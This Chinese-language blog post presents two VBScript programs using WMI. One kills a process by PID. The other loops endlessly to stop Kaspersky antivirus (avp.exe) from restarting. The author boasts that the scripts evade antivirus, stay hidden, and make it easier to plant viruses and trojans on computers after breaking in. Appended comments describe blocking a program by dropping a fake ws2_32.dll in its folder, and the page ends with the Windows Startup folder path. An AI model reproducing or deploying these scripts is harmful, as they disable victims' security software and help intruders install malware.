# 用VBS实现脚本结束进程与防止进程启动



今天下午没课，躲进私人空间开始思考些问题。在浏览VBS相关案例时，自己写了两个小程序出来，有Hack性质的（其实只要能“借刀杀人”，什么软件没黑客性质？- -!）。Kill.vbs用来在cmd下结束进程，Dis.vbs用来在窗口模式下防止某进程再次启动。这两个VBS都不会被杀毒软件KILL掉，并且有一定的隐蔽性……看代码！（'为注释）

Kill.vbs：

复制代码代码如下:


```vbscript
for each ps in getobject _  
("winmgmts:\.\root\cimv2:win32_process").instances_ '涉及到WMI脚本入侵技术，我不能解释清楚！ 
if ps.handle=wscript.arguments(0) then  '判断进程的PID号是否与获得的PID号参数相等 
wscript.echo ps.terminate '如果相等就结束指定PID号对应的进程 
end if 
next 
```



Dis.vbs

复制代码代码如下:

```vbscript
dim y,x '不要这行也行…… 
do '来个死循环……一直在判断！do ... loop内为循环体！ 
set y=getobject("winmgmts:\.\root\cimv2") '和上面解释一样，这也是涉及到微软的WMI技术！ 
set x=y.execquery("select * from win32_process where name='avp.exe'")  
'查询语句，where后判断avp.exe（卡巴）是否存在进程中！ 
'这样当卡巴被上面的Kill.vbs结束时就再也启动不起来了。除非，把Dis.vbs结束了先…… 
for each i in x  
i.terminate()  '卡巴要启动马上就终止…… 
next  
wscript.sleep 
loop 

```



解释够清楚了，那就来看看这两个vbs是如何工作的吧。我将Kill.vbs与Dis.vbs放在C盘根目录下。

打开cmd，输入cd\回到C盘根目录下，输入tasklist查看当前系统的进程情况，然后记下你想kill的进程的PID号，输入cscript Kill.vbs 2200即可结束PID为2200的进程了！假如这个进程是avp.exe，那你就可以输入Dis.vbs启动Dis.vbs来防止卡巴继续被启动。Dis.vbs启动时仅在任务管理器的进程中有wscript.exe进程项，要是不结束这个进程是无法再次启动卡巴的。

懂得这些，为以后入侵他人电脑后上传病毒、木马之类的就更方便了一点点……上面的所有过程都经本人试验成功了，继续完善……

复制代码代码如下:

ws2_32.dll 
在程序目录里建立这个也能组织程序运行 
 Greysign - 2007-03-20 19:01 阻止. 
 ycosxhack - 2007-03-20 19:15 
我晕了，果然啊！建立个记事本改名为ws2_32.dll，就……好，记下啦！呵呵……  
 Greysign - 2007-03-20 21:21 
运行程序会在WINDOWS目录寻找这个接口文件.但是会先在程序目录先搜索一遍  
 ycosxhack - 2007-03-20 21:43  
接口文件？你的意思是：任何程序都必须寻找它了？调用这个库文件吧？删了它就真正麻烦了…… 
 Greysign - 2007-03-20 22:37 嗯.



```
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\StartUp
```

